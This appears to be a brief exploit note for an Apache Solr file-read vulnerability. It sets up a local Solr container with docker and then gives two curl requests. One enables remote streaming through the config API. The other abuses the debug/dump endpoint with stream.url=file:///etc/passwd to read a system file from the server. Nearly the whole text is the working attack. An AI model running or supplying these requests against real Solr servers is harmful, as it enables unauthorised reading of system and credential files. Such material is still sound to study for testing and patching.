#Apache Solr 0-day

## Hacked by: https://mp.weixin.qq.com/s/3WuWUGO61gM0dBpwqTfenQ 
```
# stand up test on docker
docker run --name solrbear -d -p 8983:8983 -t solr
docker start solrbear

# Enable remote stream
TARGET="localhost:8983"
curl -d '{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}' http://$TARGET/solr/movie/config -H 'Content-type:application/json'

# Exploit

curl "http://$TARGET/solr/movie/debug/dump?param=ContentStreams" -F "stream.url=file:///etc/passwd"

```

